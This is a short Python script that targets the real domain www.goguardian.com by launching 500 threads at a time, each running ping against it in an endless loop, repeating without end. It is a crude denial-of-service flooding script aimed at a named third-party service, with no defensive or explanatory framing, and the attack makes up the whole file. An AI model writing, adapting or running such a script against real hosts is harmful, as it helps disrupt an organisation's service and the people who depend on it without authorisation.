import subprocess
import threading

target = "www.goguardian.com"

def ping():
    while True:
        subprocess.call(["ping", "-c", "1", target])

while True:
    threads = []
    for i in range(500):
        thread = threading.Thread(target=ping)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
